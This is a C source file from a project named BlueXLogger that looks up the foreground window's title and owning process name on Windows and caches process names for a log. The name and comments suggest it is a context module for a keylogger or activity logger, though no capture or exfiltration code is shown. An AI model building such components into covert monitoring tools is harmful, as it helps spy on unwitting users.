/*============================================================================
 * BlueXLogger - bxl_context.c
 * Foreground window title + owning process name resolution.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_context.h"
#include "bxl_util.h"

void bxl_context_cache_init(BxlContextCache *c)
{
    if (!c) return;
    memset(c, 0, sizeof(*c));
}

static const char *cache_lookup(BxlContextCache *c, DWORD pid)
{
    int i;
    if (!c) return NULL;
    for (i = 0; i < c->count; i++)
        if (c->entries[i].pid == pid) return c->entries[i].name;
    return NULL;
}

static void cache_store(BxlContextCache *c, DWORD pid, const char *name)
{
    int slot;
    if (!c || !name) return;

    slot = (c->count < BXL_CTX_CACHE) ? c->count : c->next;
    c->entries[slot].pid = pid;
    bxl_str_copy(c->entries[slot].name, BXL_CTX_PROC_MAX, name);

    if (c->count < BXL_CTX_CACHE) c->count++;
    else c->next = (c->next + 1) % BXL_CTX_CACHE;
}

int bxl_context_process_name(BxlContextCache *cache, DWORD pid,
                             char *out, size_t out_cch)
{
    wchar_t path[MAX_PATH * 2];
    DWORD   n = (DWORD)BXL_COUNT_OF(path);
    HANDLE  h;
    const char *cached;
    const wchar_t *base;

    if (!out || out_cch == 0) return BXL_FALSE;
    out[0] = '\0';

    if (pid == 0) {
        bxl_str_copy(out, out_cch, "System Idle");
        return BXL_TRUE;
    }

    cached = cache_lookup(cache, pid);
    if (cached) {
        bxl_str_copy(out, out_cch, cached);
        return BXL_TRUE;
    }

    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) {
        /* Protected or elevated process - name the PID rather than fail. */
        StringCchPrintfA(out, out_cch, "pid:%lu", (unsigned long)pid);
        return BXL_FALSE;
    }

    path[0] = L'\0';
    if (!QueryFullProcessImageNameW(h, 0, path, &n)) {
        CloseHandle(h);
        StringCchPrintfA(out, out_cch, "pid:%lu", (unsigned long)pid);
        return BXL_FALSE;
    }
    CloseHandle(h);

    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;

    if (!bxl_wide_to_utf8(base, out, out_cch)) {
        StringCchPrintfA(out, out_cch, "pid:%lu", (unsigned long)pid);
        return BXL_FALSE;
    }

    cache_store(cache, pid, out);
    return BXL_TRUE;
}

int bxl_context_get(BxlContextCache *cache, BxlContext *out)
{
    HWND  hwnd;
    DWORD pid = 0;
    int   title_len;

    if (!out) return BXL_FALSE;
    memset(out, 0, sizeof(*out));

    hwnd = GetForegroundWindow();
    if (!hwnd) {
        bxl_str_copy(out->process, BXL_CTX_PROC_MAX, "unknown");
        bxl_str_copy(out->title, BXL_CTX_TITLE_MAX, "");
        out->updated_ms = bxl_now_ms();
        return BXL_FALSE;
    }

    GetWindowThreadProcessId(hwnd, &pid);
    out->pid = pid;

    bxl_context_process_name(cache, pid, out->process, BXL_CTX_PROC_MAX);

    {
        wchar_t wtitle[BXL_CTX_TITLE_MAX];
        wtitle[0] = L'\0';
        title_len = GetWindowTextW(hwnd, wtitle, BXL_COUNT_OF(wtitle));
        if (title_len <= 0) {
            /* Some windows (UWP hosts, chrome renderers) keep the caption
             * elsewhere; fall back to the class name. */
            wchar_t cls[128];
            cls[0] = L'\0';
            GetClassNameW(hwnd, cls, BXL_COUNT_OF(cls));
            StringCchCopyW(wtitle, BXL_COUNT_OF(wtitle), cls);
        }
        if (!bxl_wide_to_utf8(wtitle, out->title, BXL_CTX_TITLE_MAX))
            out->title[0] = '\0';
    }

    /* Titles can be very long; keep the log readable. */
    if (strlen(out->title) > 200) {
        out->title[200] = '\0';
        StringCchCatA(out->title, BXL_CTX_TITLE_MAX, "...");
    }

    out->updated_ms = bxl_now_ms();
    return BXL_TRUE;
}

int bxl_context_changed(const BxlContext *a, const BxlContext *b)
{
    if (!a || !b) return BXL_TRUE;
    if (a->pid != b->pid) return BXL_TRUE;
    if (strcmp(a->process, b->process) != 0) return BXL_TRUE;
    if (strcmp(a->title, b->title) != 0) return BXL_TRUE;
    return BXL_FALSE;
}
